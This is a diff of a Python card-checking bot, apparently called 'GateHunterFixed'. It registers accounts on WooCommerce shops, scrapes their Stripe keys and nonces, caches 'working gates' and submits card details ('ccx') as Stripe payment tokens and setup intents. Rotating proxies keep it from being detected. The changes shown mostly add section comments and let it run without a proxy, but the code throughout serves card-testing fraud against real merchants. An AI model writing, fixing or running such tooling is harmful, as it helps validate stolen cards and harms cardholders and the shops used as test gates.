@@ -59,9 +59,13 @@ class GateHunterFixed:
         self._nonce_cache = {}
         self._nonce_lock = threading.Lock()
 
+    # ============================================================
+    # SESSIONS
+    # ============================================================
     def create_new_session(self, proxy_dict=None):
         session = requests.Session()
         session.verify = False
+        # CRITICAL FIX: only update proxies if proxy_dict is not None
         if proxy_dict:
             session.proxies.update(proxy_dict)
         session.headers.update({
@@ -90,6 +94,9 @@ class GateHunterFixed:
     def _save_nonce_cache(self, domain, nonce):
         pass
 
+    # ============================================================
+    # GATE CACHE
+    # ============================================================
     def save_gate_details(self, domain, stripe_key, nonce, setup_nonce, cookies=None):
         try:
             cache_data = {}
@@ -126,6 +133,9 @@ class GateHunterFixed:
             return False
         return 'stripe_key' in gate_data
 
+    # ============================================================
+    # HTTP
+    # ============================================================
     def normalize_url(self, url):
         if not url.startswith(('http://', 'https://')):
             url = 'https://' + url
@@ -154,6 +164,9 @@ class GateHunterFixed:
         except Exception:
             return None
 
+    # ============================================================
+    # REGISTER
+    # ============================================================
     def register_user(self, session, domain, proxy_dict=None):
         base_url = self.normalize_url(domain)
         reg_url = f"{base_url}/my-account/"
@@ -201,6 +214,9 @@ class GateHunterFixed:
         except Exception as e:
             return False, f"Register error: {str(e)[:80]}"
 
+    # ============================================================
+    # PAYMENT PAGE SCRAPE
+    # ============================================================
     def get_payment_page_data(self, session, domain, use_cache=True):
         saved_pattern = None
         cached_stripe_key = None
@@ -280,6 +296,9 @@ class GateHunterFixed:
 
         return None, None, None, None
 
+    # ============================================================
+    # STRIPE PAYMENT METHOD
+    # ============================================================
     def create_stripe_payment_token(self, stripe_key, card_details, proxy_dict=None):
         try:
             headers = {
@@ -334,6 +353,9 @@ class GateHunterFixed:
         except Exception as e:
             return False, None, str(e)
 
+    # ============================================================
+    # CONFIRM SETUP INTENT
+    # ============================================================
     def confirm_setup_intent_with_saved_pattern(self, session, domain, payment_token,
                                                 nonce, pattern):
         base_url = self.normalize_url(domain)
@@ -469,6 +491,9 @@ class GateHunterFixed:
                         continue
         return False, {'error': 'All attempts failed'}
 
+    # ============================================================
+    # MAIN PROCESS
+    # ============================================================
     def process_single_gate(self, domain, ccx, proxy_dict=None, use_cache=True):
         start_time = time.time()
         saved_pattern = None
@@ -502,7 +527,7 @@ class GateHunterFixed:
                                   cached_data.get('payment_pattern'))
             cached_stripe_key = cached_data.get('stripe_key') if cached_data else None
 
-            # FAST PATH
+            # FAST PATH — cached pattern + cached key
             if has_cached_pattern and cached_stripe_key:
                 saved_pattern = cached_data['payment_pattern']
                 session = self.create_new_session(proxy_dict)
@@ -622,7 +647,7 @@ class GateHunterFixed:
 
 
 # ============================================
-# SINGLE HUNTER INSTANCE
+# SINGLE INSTANCE
 # ============================================
 hunter = GateHunterFixed(cache_file="working_gates.txt", expiry_minutes=30)
 
@@ -879,13 +904,13 @@ def get_proxy_for_request_global(chat_id=None):
         if prem:
             return random.choice(prem)
 
-    # 2) user
+    # 2) per-user
     if chat_id:
         p = get_user_proxy(chat_id)
         if p:
             return p
 
-    # 3) proxies.txt fallback
+    # 3) FALLBACK — proxies.txt
     try:
         if os.path.exists(PROXIES_TXT_FILE):
             with open(PROXIES_TXT_FILE) as f:
@@ -911,7 +936,7 @@ def get_proxy_for_request(chat_id=None):
 
 
 # ============================================
-# BOT INTERFACE
+# BOT INTERFACE  — CRITICAL FIX HERE
 # ============================================
 def process_card_enhanced(domain, ccx, chat_id=None, use_registration=True,
                           received_proxy=None):
@@ -921,7 +946,8 @@ def process_card_enhanced(domain, ccx, chat_id=None, use_registration=True,
     if not proxy:
         proxy = get_proxy_for_request(chat_id)
 
-    # If no proxy — go DIRECT (do not error)
+    # ⬇️⬇️⬇️ THE KEY FIX ⬇️⬇️⬇️
+    # If no proxy — DON'T fail, just go DIRECT (proxy_dict=None)
     if proxy:
         proxy_dict = {'http': proxy['http'], 'https': proxy['https']}
     else:
